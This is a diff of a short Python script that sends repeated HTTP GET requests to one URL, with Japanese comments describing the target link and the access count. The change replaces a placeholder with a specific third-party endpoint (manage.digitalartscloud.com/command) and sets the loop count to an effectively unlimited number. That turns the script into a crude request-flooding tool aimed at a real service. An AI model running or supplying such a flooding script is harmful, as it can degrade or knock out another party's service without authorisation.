@@ -1,8 +1,8 @@
 import requests
 
 num = 1
-url = "https://---"  #アクセスするリンクを---に挿入
-AccessTime = 400     #連続してアクセスする回数を指定
+url = "https://manage.digitalartscloud.com/command"  #アクセスするリンクを---に挿入
+AccessTime = 99999999999999999999999999999999999999999999    #連続してアクセスする回数を指定
 print("AccessURL-->"+str(url))
 
 while num <= AccessTime:
@@ -13,7 +13,8 @@ while num <= AccessTime:
         print(str(num)+"th-success. request-success <" +
               str(response.status_code)+">")
     else:
-        print(str(num)+"th-success. request-failure")
+        print(str(num)+"th-success. request-failure" "<" +
+              str(response.status_code)+">")
 
     num += 1
 
